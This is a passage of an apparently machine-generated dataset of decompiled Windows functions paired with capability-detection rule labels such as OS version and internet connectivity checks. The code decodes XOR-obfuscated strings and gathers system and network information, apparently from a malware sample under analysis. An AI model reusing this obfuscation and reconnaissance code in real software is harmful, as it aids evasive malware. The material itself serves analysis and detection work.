     var_13ch = 100;\n                var_13bh = 0x6f;\n                var_b8h._0_1_ = 0x6d;\n                var_b8h._1_1_ = 0x53;\n                var_b8h._2_1_ = 0x45;\n                var_b8h._3_1_ = 100;\n                var_b4h = 0x6f;\n                fcn.004012a0(0x14);\n                for (var_30h = 0; var_30h < 10; var_30h = var_30h + 1) {\n                    fcn.00401280(var_30h, var_144h[var_30h] ^ *(&var_b8h + var_30h % 5));\n                }\n                var_15ch._0_1_ = 2;\n                var_15ch._1_1_ = 0x4b;\n                var_15ch._2_1_ = 0x2f;\n                var_15ch._3_1_ = 0x4d;\n                var_158h = 0x1a;\n                var_157h = 0x51;\n                var_156h = 10;\n                var_155h = 0x4b;\n                var_154h = 0x25;\n                var_153h = 0x4d;\n                var_152h = 0x77;\n                var_151h = 0x51;\n                var_100h._0_1_ = 99;\n                var_100h._1_1_ = 0x4b;\n                var_100h._2_1_ = 0x4b;\n                var_100h._3_1_ = 0x4d;\n                var_fch = 0x77;\n                var_fbh = 0x51;\n                fcn.004012a0(0x18);\n                for (var_34h = 0; var_34h < 0xc; var_34h = var_34h + 1) {\n                    fcn.00401280(var_34h, *(&var_15ch + var_34h) ^ *(&var_100h + var_34h % 6));\n                }\n                var_170h[0] = 0x50;\n                var_170h[1] = 0x53;\n                var_170h[2] = 0x14;\n                var_170h[3] = 0x74;\n                var_16ch = 0x2e;\n                var_16bh = 0x68;\n                var_16ah = 0x42;\n                var_169h = 0x53;\n                var_168h = 0xf;\n                var_167h = 0x74;\n                var_166h = 0x26;\n                var_165h = 0x68;\n                var_164h = 0x5d;\n                var_163h = 0x53;\n                var_162h = 0x15;\n                var_161h = 0x74;\n                var_160h = 0x47;\n                var_15fh = 0x68;\n                var_108h._0_1_ = 0x38;\n                var_108h._1_1_ = 0x53;\n                var_108h._2_1_ = 0x61;\n                var_108h._3_1_ = 0x74;\n                var_104h = 0x47;\n                var_103h = 0x68;\n                fcn.004012a0(0x24);\n                for (var_38h = 0; var_38h < 0x12; var_38h = var_38h + 1) {\n                    fcn.00401280(var_38h, var_170h[var_38h] ^ *(&var_108h + var_38h % 6));\n                }\n                var_4a0h = *(var_ch + 0xc);\n                if (var_4a0h == 0) {\n                    var_64h = fcn.00401270();\n                }\n                else if (var_4a0h == 1) {\n                    var_64h = fcn.00401270();\n                }\n                else if (var_4a0h == 2) {\n                    var_64h = fcn.00401270();\n                }\n                else {\n                    var_64h = fcn.00401270();\n                }\n                var_48ch._0_1_ = 0x16;\n                var_48ch._1_1_ = 0x6d;\n                var_48ch._2_1_ = 0x6f;\n                var_48ch._3_1_ = 0x68;\n                var_488h = 0x25;\n                var_487h = 0x4d;\n                var_486h = 0x3d;\n                var_485h = 0x6d;\n                var_484h = 0x27;\n                var_483h = 0x68;\n                var_482h = 2;\n                var_481h = 0x4d;\n                var_480h = 99;\n                var_47fh = 0x6d;\n                var_47eh = 0xb;\n                var_47dh = 0x68;\n                var_47ch = 0x1e;\n                var_47bh = 0x4d;\n                var_47ah = 0x28;\n                var_479h = 0x6d;\n                var_478h = 0x2d;\n                var_477h = 0x68;\n                var_476h = 0x4a;\n                var_475h = 0x4d;\n                var_474h = 0x6e;\n                var_473h = 0x6d;\n                var_472h = 0x67;\n                var_471h = 0x68;\n                var_470h = 7;\n                var_46fh = 0x4d;\n                var_46eh = 0x3d;\n                var_46dh = 0x6d;\n                var_46ch = 0x3e;\n                var_46bh = 0x68;\n                var_46ah = 0x55;\n                var_469h = 0x4d;\n                var_468h = 0x39;\n                var_467h = 0x6d;\n                var_466h = 0x31;\n                var_465h = 0x68;\n                var_464h = 0xc;\n                var_463h = 0x4d;\n                var_462h = 0x7e;\n                var_461h = 0x6d;\n                var_460h = 0x3a;\n                var_45fh = 0x68;\n                var_45eh = 0x55;\n                var_45dh = 0x4d;\n                var_45ch = 0x3e;\n                var_45bh = 0x6d;\n                var_45ah = 0x3e;\n                var_459h = 0x68;\n                var_458h = 0x40;\n                var_457h = 0x4d;\n                var_456h = 0x36;\n                var_455h = 0x6d;\n                var_454h = 0x67;\n                var_453h = 0x68;\n                var_452h = 0;\n                var_451h = 0x4d;\n                var_450h = 0x32;\n                var_44fh = 0x6d;\n                var_44eh = 0x67;\n                var_44dh = 0x68;\n                var_44ch = 7;\n                var_44bh = 0x4d;\n                var_44ah = 0x3d;\n                var_449h = 0x6d;\n                var_448h = 0x3e;\n                var_447h = 0x68;\n                var_446h = 0x55;\n                var_445h = 0x4d;\n                var_444h = 0x39;\n                var_443h = 0x6d;\n                var_442h = 0x31;\n                var_441h = 0x68;\n                var_440h = 0x70;\n                var_43fh = 0x4d;\n                var_110h[0] = 0x4e;\n                var_110h[1] = 0x6d;\n                var_110h[2] = 0x42;\n                var_110h[3] = 0x68;\n                var_10ch = 0x70;\n                var_10bh = 0x4d;\n                fcn.004012a0(0x9c);\n                for (var_3ch = 0; var_3ch < 0x4e; var_3ch = var_3ch + 1) {\n                    fcn.00401280(var_3ch, *(&var_48ch + var_3ch) ^ var_110h[var_3ch % 6]);\n                }\n                uVar1 = fcn.00401270(var_68h, var_6ch, *(var_ch + 0x20), *(var_ch + 0x18), var_64h, *(var_ch + 0x54));\n                (*_sym.imp.USER32.dll_wsprintfW)(lpString, uVar1);\n                uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString, 0x10000000);\n                (*var_8h)(arg_8h, lpString, uVar1);\n                (*_sym.imp.NETAPI32.dll_NetApiBufferFree)(var_ch);\n                fcn.004012d0();\n                fcn.004012d0();\n                fcn.004012d0();\n                fcn.004012d0();\n                fcn.004012d0();\n            }\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_68h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_6ch);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n        var_250h[0] = 0x17;\n        var_250h[1] = 0x73;\n        var_250h[2] = 0x40;\n        var_250h[3] = 0x34;\n        var_24ch = 0x7b;\n        var_24bh = 0x4f;\n        var_24ah = 0;\n        var_249h = 0x6d;\n        var_248h = 0x60;\n        var_247h = 0x32;\n        var_246h = 0x3d;\n        var_245h = 0x73;\n        var_244h = 0x18;\n        var_243h = 0x34;\n        var_242h = 0x41;\n        var_241h = 0x4f;\n        var_240h = 7;\n        var_23fh = 0x6d;\n        var_23eh = 0x51;\n        var_23dh = 0x32;\n        var_23ch = 0x2b;\n        var_23bh = 0x73;\n        var_23ah = 0x2e;\n        var_239h = 0x34;\n        var_238h = 0x5d;\n        var_237h = 0x4f;\n        var_236h = 0x1e;\n        var_235h = 0x6d;\n        var_234h = 0x44;\n        var_233h = 0x32;\n        var_232h = 0x75;\n        var_231h = 0x73;\n        var_230h = 0x4d;\n        var_22fh = 0x34;\n        var_22eh = 0x17;\n        var_22dh = 0x4f;\n        var_22ch = 0x17;\n        var_22bh = 0x6d;\n        var_22ah = 0x34;\n        var_229h = 0x32;\n        var_b0h._0_1_ = 0x4f;\n        var_b0h._1_1_ = 0x73;\n        var_b0h._2_1_ = 0x6d;\n        var_b0h._3_1_ = 0x34;\n        var_ach = 0x32;\n        fcn.004012a0(0x50);\n        for (var_40h = 0; var_40h < 0x28; var_40h = var_40h + 1) {\n            fcn.00401280(var_40h, var_250h[var_40h] ^ *(&var_b0h + var_40h % 5));\n        }\n        uVar1 = fcn.00421570();\n        uVar1 = fcn.00401270(uVar1);\n        (*_sym.imp.USER32.dll_wsprintfW)(lpString, uVar1);\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString, 0x10000000);\n        (*var_8h)(arg_8h, lpString, uVar1);\n        fcn.004012d0();\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpString);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        fcn.004012d0();\n    }\n    if (arg_ch == 0) {\n        var_328h._0_1_ = 0xf;\n        var_328h._1_1_ = 100;\n        var_328h._2_1_ = 0x4b;\n        var_328h._3_1_ = 0x41;\n        var_324h = 0x2b;\n        var_323h = 0x78;\n        var_322h = 3;\n        var_321h = 100;\n        var_320h = 0x32;\n        var_31fh = 0x41;\n        var_31eh = 0x33;\n        var_31dh = 0x78;\n        var_31ch = 0x7a;\n        var_31bh = 100;\n        var_31ah = 0x27;\n        var_319h = 0x41;\n        var_318h = 4;\n        var_317h = 0x78;\n        var_316h = 0x32;\n        var_315h = 100;\n        var_314h = 8;\n        var_313h = 0x41;\n        var_312h = 0x17;\n        var_311h = 0x78;\n        var_310h = 0x6d;\n        var_30fh = 100;\n        var_30eh = 0x46;\n        var_30dh = 0x41;\n        var_30ch = 0x34;\n        var_30bh = 0x78;\n        var_30ah = 0x1e;\n        var_309h = 100;\n        var_308h = 0x28;\n        var_307h = 0x41;\n        var_306h = 0x2b;\n        var_305h = 0x78;\n        var_304h = 3;\n        var_303h = 100;\n        var_302h = 0x32;\n        var_301h = 0x41;\n        var_300h = 0x33;\n        var_2ffh = 0x78;\n        var_2feh = 0x57;\n        var_2fdh = 100;\n        var_120h._0_1_ = 0x57;\n        var_120h._1_1_ = 100;\n        var_120h._2_1_ = 0x66;\n        var_120h._3_1_ = 0x41;\n        var_11ch = 99;\n        var_11bh = 0x78;\n        fcn.004012a0(0x58);\n        for (var_48h = 0; var_48h < 0x2c; var_48h = var_48h + 1) {\n            fcn.00401280(var_48h, *(&var_328h + var_48h) ^ *(&var_120h + var_48h % 6));\n        }\n        uVar1 = fcn.00401270(0x10000000);\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(uVar1);\n        uVar1 = fcn.00401270(uVar1);\n        (*var_8h)(arg_8h, uVar1);\n        fcn.004012d0();\n    }\n    else {\n        var_2fch[0] = 0x6f;\n        var_2fch[1] = 0x79;\n        var_2fch[2] = 0x6e;\n        var_2fch[3] = 0x66;\n        var_2f8h = 0x7b;\n        var_2f7h = 0x44;\n        var_2f6h = 99;\n        var_2f5h = 0x79;\n        var_2f4h = 0x17;\n        var_2f3h = 0x66;\n        var_2f2h = 99;\n        var_2f1h = 0x44;\n        var_2f0h = 0x1a;\n        var_2efh = 0x79;\n        var_2eeh = 2;\n        var_2edh = 0x66;\n        var_2ech = 0x54;\n        var_2ebh = 0x44;\n        var_2eah = 0x52;\n        var_2e9h = 0x79;\n        var_2e8h = 0x2d;\n        var_2e7h = 0x66;\n        var_2e6h = 0x47;\n        var_2e5h = 0x44;\n        var_2e4h = 0xd;\n        var_2e3h = 0x79;\n        var_2e2h = 99;\n        var_2e1h = 0x66;\n        var_2e0h = 100;\n        var_2dfh = 0x44;\n        var_2deh = 0x7e;\n        var_2ddh = 0x79;\n        var_2dch = 0xd;\n        var_2dbh = 0x66;\n        var_2dah = 0x7a;\n        var_2d9h = 0x44;\n        var_2d8h = 0x79;\n        var_2d7h = 0x79;\n        var_2d6h = 6;\n        var_2d5h = 0x66;\n        var_2d4h = 0x67;\n        var_2d3h = 0x44;\n        var_2d2h = 0x37;\n        var_2d1h = 0x79;\n        var_118h[0] = 0x37;\n        var_118h[1] = 0x79;\n        var_118h[2] = 0x43;\n        var_118h[3] = 0x66;\n        var_114h = 0x33;\n        var_113h = 0x44;\n        fcn.004012a0(0x58);\n        for (var_44h = 0; var_44h < 0x2c; var_44h = var_44h + 1) {\n            fcn.00401280(var_44h, var_2fch[var_44h] ^ var_118h[var_44h % 6]);\n        }\n        uVar1 = fcn.00401270(0x10000000);\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(uVar1);\n        uVar1 = fcn.00401270(uVar1);\n        (*var_8h)(arg_8h, uVar1);\n        fcn.004012d0();\n    }\n    var_354h._0_1_ = 0x60;\n    var_354h._1_1_ = 0x61;\n    var_354h._2_1_ = 0x14;\n    var_354h._3_1_ = 0x37;\n    var_350h = 0x33;\n    var_34fh = 0x68;\n    var_34eh = 0x4a;\n    var_34dh = 0x61;\n    var_34ch = 0x56;\n    var_34bh = 0x37;\n    var_34ah = 0x1b;\n    var_349h = 0x68;\n    var_348h = 0x41;\n    var_347h = 0x61;\n    var_346h = 0x14;\n    var_345h = 0x37;\n    var_344h = 0x33;\n    var_343h = 0x68;\n    var_342h = 0x4a;\n    var_341h = 0x61;\n    var_340h = 0x5c;\n    var_33fh = 0x37;\n    var_33eh = 0x10;\n    var_33dh = 0x68;\n    var_33ch = 0x5d;\n    var_33bh = 0x61;\n    var_33ah = 0x57;\n    var_339h = 0x37;\n    var_338h = 0x17;\n    var_337h = 0x68;\n    var_336h = 2;\n    var_335h = 0x61;\n    var_334h = 0x19;\n    var_333h = 0x37;\n    var_332h = 0x37;\n    var_331h = 0x68;\n    var_330h = 0x6a;\n    var_32fh = 0x61;\n    var_32eh = 0x6c;\n    var_32dh = 0x37;\n    var_32ch = 0x26;\n    var_32bh = 0x68;\n    var_32ah = 0x38;\n    var_329h = 0x61;\n    var_128h._0_1_ = 0x38;\n    var_128h._1_1_ = 0x61;\n    var_128h._2_1_ = 0x39;\n    var_128h._3_1_ = 0x37;\n    var_124h = 99;\n    var_123h = 0x68;\n    fcn.004012a0(0x58);\n    for (var_4ch = 0; var_4ch < 0x2c; var_4ch = var_4ch + 1) {\n        fcn.00401280(var_4ch, *(&var_354h + var_4ch) ^ *(&var_128h + var_4ch % 6));\n    }\n    var_384h._0_1_ = 0x2c;\n    var_384h._1_1_ = 0x34;\n    var_384h._2_1_ = 0x1a;\n    var_384h._3_1_ = 0x41;\n    var_380h = 0x1c;\n    var_37fh = 0x74;\n    var_37eh = 0x46;\n    var_37dh = 0x37;\n    var_37ch = 0x2e;\n    var_37bh = 0x4c;\n    var_37ah = 0xc;\n    var_379h = 0x34;\n    var_378h = 0x4e;\n    var_377h = 0x41;\n    var_376h = 0x61;\n    var_375h = 0x74;\n    var_374h = 100;\n    var_373h = 0x37;\n    var_372h = 0x33;\n    var_371h = 0x4c;\n    var_370h = 0x11;\n    var_36fh = 0x34;\n    var_36eh = 0x44;\n    var_36dh = 0x41;\n    var_36ch = 0x29;\n    var_36bh = 0x74;\n    var_36ah = 0x5a;\n    var_369h = 0x37;\n    var_368h = 0x35;\n    var_367h = 0x4c;\n    var_366h = 0x4e;\n    var_365h = 0x34;\n    var_364h = 0x17;\n    var_363h = 0x41;\n    var_362h = 10;\n    var_361h = 0x74;\n    var_360h = 0x75;\n    var_35fh = 0x37;\n    var_35eh = 0xd;\n    var_35dh = 0x4c;\n    var_35ch = 0x27;\n    var_35bh = 0x34;\n    var_35ah = 0x72;\n    var_359h = 0x41;\n    var_358h = 0x4c;\n    var_357h = 0x74;\n    var_a8h._0_1_ = 0x74;\n    var_a8h._1_1_ = 0x34;\n    var_a8h._2_1_ = 0x37;\n    var_a8h._3_1_ = 0x41;\n    var_a4h = 0x4c;\n    fcn.004012a0(0x5c);\n    for (var_50h = 0; var_50h < 0x2e; var_50h = var_50h + 1) {\n        fcn.00401280(var_50h, *(&var_384h + var_50h) ^ *(&var_a8h + var_50h % 5));\n    }\n    var_228h._0_1_ = 0x1c;\n    var_228h._1_1_ = 0x70;\n    var_228h._2_1_ = 0x7f;\n    var_228h._3_1_ = 0x71;\n    var_224h = 0x29;\n    var_223h = 0x4e;\n    var_222h = 0x36;\n    var_221h = 0x70;\n    var_220h = 0x3d;\n    var_21fh = 0x71;\n    var_21eh = 1;\n    var_21dh = 0x4e;\n    var_21ch = 0x3d;\n    var_21bh = 0x70;\n    var_21ah = 0x7f;\n    var_219h = 0x71;\n    var_218h = 0x2c;\n    var_217h = 0x4e;\n    var_216h = 0x37;\n    var_215h = 0x70;\n    var_214h = 0x37;\n    var_213h = 0x71;\n    var_212h = 0x1d;\n    var_211h = 0x4e;\n    var_210h = 0x7e;\n    var_20fh = 0x70;\n    var_20eh = 0x72;\n    var_20dh = 0x71;\n    var_20ch = 0x2d;\n    var_20bh = 0x4e;\n    var_20ah = 0x16;\n    var_209h = 0x70;\n    var_208h = 7;\n    var_207h = 0x71;\n    var_206h = 0x3c;\n    var_205h = 0x4e;\n    var_204h = 0x44;\n    var_203h = 0x70;\n    var_130h._0_1_ = 0x44;\n    var_130h._1_1_ = 0x70;\n    var_130h._2_1_ = 0x52;\n    var_130h._3_1_ = 0x71;\n    var_12ch = 0x79;\n    var_12bh = 0x4e;\n    fcn.004012a0(0x4c);\n    for (var_54h = 0; var_54h < 0x26; var_54h = var_54h + 1) {\n        fcn.00401280(var_54h, *(&var_228h + var_54h) ^ *(&var_130h + var_54h % 6));\n    }\n    var_278h._0_1_ = 0x29;\n    var_278h._1_1_ = 0x68;\n    var_278h._2_1_ = 0x65;\n    var_278h._3_1_ = 0x6f;\n    var_274h = 0x33;\n    var_273h = 0x71;\n    var_272h = 0x1a;\n    var_271h = 0x48;\n    var_270h = 0;\n    var_26fh = 99;\n    var_26eh = 9;\n    var_26dh = 0x68;\n    var_26ch = 0x31;\n    var_26bh = 0x6f;\n    var_26ah = 0x4e;\n    var_269h = 0x71;\n    var_268h = 0x3d;\n    var_267h = 0x48;\n    var_266h = 0x1c;\n    var_265h = 99;\n    var_264h = 0x14;\n    var_263h = 0x68;\n    var_262h = 0x2c;\n    var_261h = 0x6f;\n    var_260h = 0x59;\n    var_25fh = 0x71;\n    var_25eh = 0x48;\n    var_25dh = 0x48;\n    var_25ch = 0x29;\n    var_25bh = 99;\n    var_25ah = 0x30;\n    var_259h = 0x68;\n    var_258h = 4;\n    var_257h = 0x6f;\n    var_256h = 0x30;\n    var_255h = 0x71;\n    var_254h = 0x2d;\n    var_253h = 0x48;\n    var_252h = 0x6f;\n    var_251h = 99;\n    var_98h._0_1_ = 0x71;\n    var_98h._1_1_ = 0x68;\n    var_98h._2_1_ = 0x48;\n    var_98h._3_1_ = 0x6f;\n    var_94h = 99;\n    fcn.004012a0(0x50);\n    for (var_58h = 0; var_58h < 0x28; var_58h = var_58h + 1) {\n        fcn.00401280(var_58h, *(&var_278h + var_58h) ^ *(&var_98h + var_58h % 5));\n    }\n    if (arg_10h == 0) {\n        uVar1 = fcn.00401270(0x10000000);\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(uVar1);\n        uVar1 = fcn.00401270(uVar1);\n        (*var_8h)(arg_8h, uVar1);\n    }\n    else {\n        uVar1 = fcn.00401270(0x10000000);\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(uVar1);\n        uVar1 = fcn.00401270(uVar1);\n        (*var_8h)(arg_8h, uVar1);\n    }\n    if ((arg_14h == 0) || (arg_10h == 0)) {\n        uVar1 = fcn.00401270(0x10000000);\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(uVar1);\n        uVar1 = fcn.00401270(uVar1);\n        (*var_8h)(arg_8h, uVar1);\n    }\n    else {\n        uVar1 = fcn.00401270(0x10000000);\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(uVar1);\n        uVar1 = fcn.00401270(uVar1);\n        (*var_8h)(arg_8h, uVar1);\n    }\n    iVar2 = fcn.00422fc0();\n    if (iVar2 == 0) {\n        var_3ech._0_1_ = 0x35;\n        var_3ech._1_1_ = 0x61;\n        var_3ech._2_1_ = 0x1b;\n        var_3ech._3_1_ = 0x51;\n        var_3e8h = 0x3a;\n        var_3e7h = 0x6a;\n        var_3e6h = 0x1f;\n        var_3e5h = 0x61;\n        var_3e4h = 0x59;\n        var_3e3h = 0x51;\n        var_3e2h = 0x12;\n        var_3e1h = 0x6a;\n        var_3e0h = 0x14;\n        var_3dfh = 0x61;\n        var_3deh = 0x1b;\n        var_3ddh = 0x51;\n        var_3dch = 0x2b;\n        var_3dbh = 0x6a;\n        var_3dah = 0x18;\n        var_3d9h = 0x61;\n        var_3d8h = 0x42;\n        var_3d7h = 0x51;\n        var_3d6h = 5;\n        var_3d5h = 0x6a;\n        var_3d4h = 0x29;\n        var_3d3h = 0x61;\n        var_3d2h = 0x53;\n        var_3d1h = 0x51;\n        var_3d0h = 0x1e;\n        var_3cfh = 0x6a;\n        var_3ceh = 8;\n        var_3cdh = 0x61;\n        var_3cch = 0x55;\n        var_3cbh = 0x51;\n        var_3cah = 0x1e;\n        var_3c9h = 0x6a;\n        var_3c8h = 0x57;\n        var_3c7h = 0x61;\n        var_3c6h = 0x16;\n        var_3c5h = 0x51;\n        var_3c4h = 0x2c;\n        var_3c3h = 0x6a;\n        var_3c2h = 0x2c;\n        var_3c1h = 0x61;\n        var_3c0h = 0x7a;\n        var_3bfh = 0x51;\n        var_3beh = 0x39;\n        var_3bdh = 0x6a;\n        var_3bch = 0x28;\n        var_3bbh = 0x61;\n        var_3bah = 0x36;\n        var_3b9h = 0x51;\n        var_138h._0_1_ = 0x6d;\n        var_138h._1_1_ = 0x61;\n        var_138h._2_1_ = 0x36;\n        var_138h._3_1_ = 0x51;\n        var_134h = 0x6a;\n        var_133h = 0x6a;\n        fcn.004012a0(0x68);\n        for (var_60h = 0; var_60h < 0x34; var_60h = var_60h + 1) {\n            fcn.00401280(var_60h, *(&var_3ech + var_60h) ^ *(&var_138h + var_60h % 6));\n        }\n        uVar1 = fcn.00401270(0x10000000);\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(uVar1);\n        uVar1 = fcn.00401270(uVar1);\n        (*var_8h)(arg_8h, uVar1);\n        fcn.004012d0();\n    }\n    else {\n        var_3b8h[0] = 0x6f;\n        var_3b8h[1] = 0x78;\n        var_3b8h[2] = 0x4e;\n        var_3b8h[3] = 0x6c;\n        var_3b4h = 0x12;\n        var_3b3h = 0x37;\n        var_3b2h = 10;\n        var_3b1h = 99;\n        var_3b0h = 3;\n        var_3afh = 0x42;\n        var_3aeh = 0x4f;\n        var_3adh = 0x78;\n        var_3ach = 0x1a;\n        var_3abh = 0x6c;\n        var_3aah = 0x6f;\n        var_3a9h = 0x37;\n        var_3a8h = 0x39;\n        var_3a7h = 99;\n        var_3a6h = 0x19;\n        var_3a5h = 0x42;\n        var_3a4h = 0x43;\n        var_3a3h = 0x78;\n        var_3a2h = 0xc;\n        var_3a1h = 0x6c;\n        var_3a0h = 6;\n        var_39fh = 0x37;\n        var_39eh = 0x1d;\n        var_39dh = 99;\n        var_39ch = 0x18;\n        var_39bh = 0x42;\n        var_39ah = 0x52;\n        var_399h = 0x78;\n        var_398h = 0;\n        var_397h = 0x6c;\n        var_396h = 0x36;\n        var_395h = 0x37;\n        var_394h = 0x42;\n        var_393h = 99;\n        var_392h = 0x4c;\n        var_391h = 0x42;\n        var_390h = 99;\n        var_38fh = 0x78;\n        var_38eh = 0x31;\n        var_38dh = 0x6c;\n        var_38ch = 0x17;\n        var_38bh = 0x37;\n        var_38ah = 0x3d;\n        var_389h = 99;\n        var_388h = 0x6c;\n        var_387h = 0x42;\n        var_a0h._0_1_ = 0x37;\n        var_a0h._1_1_ = 0x78;\n        var_a0h._2_1_ = 99;\n        var_a0h._3_1_ = 0x6c;\n        var_9ch = 0x42;\n        fcn.004012a0(100);\n        for (var_5ch = 0; var_5ch < 0x32; var_5ch = var_5ch + 1) {\n            fcn.00401280(var_5ch, var_3b8h[var_5ch] ^ *(&var_a0h + var_5ch % 5));\n        }\n        uVar1 = fcn.00401270(0x10000000);\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(uVar1);\n        uVar1 = fcn.00401270(uVar1);\n        (*var_8h)(arg_8h, uVar1);\n        fcn.004012d0();\n    }\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    return;\n}\n",
        "token_count": 23025
    },
    "0040e590": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_5ech\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.0040e590(int32_t arg_8h, int32_t *arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t *arg_18h, int32_t *arg_1ch, \n            int32_t arg_20h, uint arg_24h, int32_t arg_28h, uint *arg_2ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint unaff_ESI;\n    uint *puVar5;\n    uint arg_ch_00;\n    uint var_5ech;\n    uint var_3e4h;\n    uint var_2e4h;\n    uint var_2d8h;\n    uint var_2d4h;\n    uint var_2c4h;\n    uint var_2c0h;\n    uint var_2bch;\n    uint var_2b8h;\n    uint var_2b4h;\n    uint var_2b0h;\n    uint var_2ach;\n    uint var_2a8h;\n    uint var_2a4h;\n    uint var_2a0h;\n    uint var_29ch;\n    uint var_298h;\n    uint var_294h;\n    uint var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint var_284h;\n    uint var_280h;\n    uint var_27ch;\n    uint var_278h;\n    uint var_274h;\n    int32_t var_270h;\n    uint var_26ch;\n    uint var_268h;\n    int32_t var_264h;\n    int32_t var_260h;\n    uint var_25ch;\n    uchar var_258h;\n    uchar var_257h;\n    uchar var_256h;\n    uchar var_255h;\n    uchar var_254h;\n    uchar var_253h;\n    uchar var_252h;\n    uchar var_251h;\n    uchar var_250h;\n    uchar var_24fh;\n    uchar var_24eh;\n    uchar var_24dh;\n    uchar var_24ch;\n    uchar var_24bh;\n    uchar var_24ah;\n    uchar var_249h;\n    uchar var_248h;\n    uchar var_247h;\n    uchar var_246h;\n    uchar var_245h;\n    uchar var_244h;\n    uchar var_243h;\n    uchar var_242h;\n    uchar var_241h;\n    uchar var_240h;\n    uchar var_23fh;\n    uchar var_23eh;\n    uchar var_23dh;\n    uchar var_23ch;\n    uchar var_23bh;\n    uchar var_23ah;\n    uchar var_239h;\n    uchar var_238h;\n    uchar var_237h;\n    uchar var_236h;\n    uchar var_235h;\n    uchar var_234h;\n    uchar var_233h;\n    uchar var_232h;\n    uchar var_231h;\n    uchar var_230h;\n    uchar var_22fh;\n    uchar var_22eh;\n    uchar var_22dh;\n    uchar var_22ch;\n    uchar var_22bh;\n    uchar var_22ah;\n    uchar var_229h;\n    uchar var_228h;\n    uchar var_227h;\n    uchar var_226h;\n    uchar var_225h;\n    uchar var_224h;\n    uchar var_223h;\n    uchar var_222h;\n    uchar var_221h;\n    uchar var_220h;\n    uchar var_21fh;\n    uchar var_21eh;\n    uchar var_21dh;\n    uchar var_21ch;\n    uchar var_21bh;\n    uchar var_21ah;\n    uchar var_219h;\n    uchar var_218h;\n    uchar var_217h;\n    uchar var_216h;\n    uchar var_215h;\n    uchar var_214h;\n    uchar var_213h;\n    uchar var_212h;\n    uchar var_211h;\n    uchar var_210h;\n    uchar var_20fh;\n    uchar var_20eh;\n    uchar var_20dh;\n    uchar var_20ch;\n    uchar var_20bh;\n    uchar var_20ah;\n    uchar var_209h;\n    uchar var_208h;\n    uchar var_207h;\n    uchar var_206h;\n    uchar var_205h;\n    uchar var_204h;\n    uchar var_203h;\n    uchar var_202h;\n    uchar var_201h;\n    uchar var_200h;\n    uchar var_1ffh;\n    uchar var_1feh;\n    uchar var_1fdh;\n    uchar var_1fch;\n    uchar var_1fbh;\n    uchar var_1fah;\n    uchar var_1f9h;\n    uchar var_1f8h;\n    uchar var_1f7h;\n    uchar var_1f6h;\n    uchar var_1f5h;\n    uchar var_1f4h;\n    uchar var_1f3h;\n    uchar var_1f2h;\n    uchar var_1f1h;\n    uchar var_1f0h;\n    uchar var_1efh;\n    uchar var_1eeh;\n    uchar var_1edh;\n    uchar var_1ech;\n    uchar var_1ebh;\n    uchar var_1eah;\n    uchar var_1e9h;\n    uchar var_1e8h;\n    uchar var_1e7h;\n    uchar var_1e6h;\n    uchar var_1e5h;\n    uchar var_1e4h;\n    uchar var_1e3h;\n    uchar var_1e2h;\n    uchar var_1e1h;\n    uchar var_1e0h;\n    uchar var_1dfh;\n    uchar var_1deh;\n    uchar var_1ddh;\n    uchar var_1dch;\n    uchar var_1dbh;\n    uchar var_1dah;\n    uchar var_1d9h;\n    uchar var_1d8h;\n    uchar var_1d7h;\n    uchar var_1d6h;\n    uchar var_1d5h;\n    uchar var_1d4h;\n    uchar var_1d3h;\n    uchar var_1d2h;\n    uchar var_1d1h;\n    uchar var_1d0h;\n    uchar var_1cfh;\n    uchar var_1ceh;\n    uchar var_1cdh;\n    uchar var_1cch;\n    uchar var_1cbh;\n    uchar var_1cah;\n    uchar var_1c9h;\n    uchar var_1c8h;\n    uchar var_1c7h;\n    uchar var_1c6h;\n    uchar var_1c5h;\n    uchar var_1c4h;\n    uchar var_1c3h;\n    uchar var_1c2h;\n    uchar var_1c1h;\n    uint var_1c0h;\n    uchar var_1bch;\n    uchar var_1bbh;\n    uchar var_1bah;\n    uchar var_1b9h;\n    uchar var_1b8h;\n    uchar var_1b7h;\n    uchar var_1b6h;\n    uchar var_1b5h;\n    uchar var_1b4h;\n    uchar var_1b3h;\n    uchar var_1b2h;\n    uchar var_1b1h;\n    uchar var_1b0h;\n    uchar var_1afh;\n    uchar var_1aeh;\n    uchar var_1adh;\n    uchar var_1ach;\n    uchar var_1abh;\n    uchar var_1aah;\n    uchar var_1a9h;\n    uchar var_1a8h;\n    uchar var_1a7h;\n    uchar var_1a6h;\n    uchar var_1a5h;\n    uchar var_1a4h;\n    uchar var_1a3h;\n    uchar var_1a2h;\n    uchar var_1a1h;\n    uchar var_1a0h;\n    uchar var_19fh;\n    uchar var_19eh;\n    uchar var_19dh;\n    uchar var_19ch;\n    uchar var_19bh;\n    uchar var_19ah;\n    uchar var_199h;\n    uchar var_198h;\n    uchar var_197h;\n    uchar var_196h;\n    uchar var_195h;\n    uchar var_194h;\n    